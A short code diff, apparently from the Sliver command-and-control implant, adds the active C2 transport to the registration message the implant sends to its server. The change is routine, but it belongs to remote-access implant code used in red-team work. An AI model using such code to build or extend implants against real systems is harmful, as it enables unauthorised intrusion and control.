@@ -122,6 +122,7 @@ func getRegisterSliver() *pb.Envelope {
 		Arch:     runtime.GOARCH,
 		Pid:      int32(os.Getpid()),
 		Filename: filename,
+		ActiveC2: transports.GetActiveC2(),
 	})
 	return &pb.Envelope{
 		Type: pb.MsgRegister,
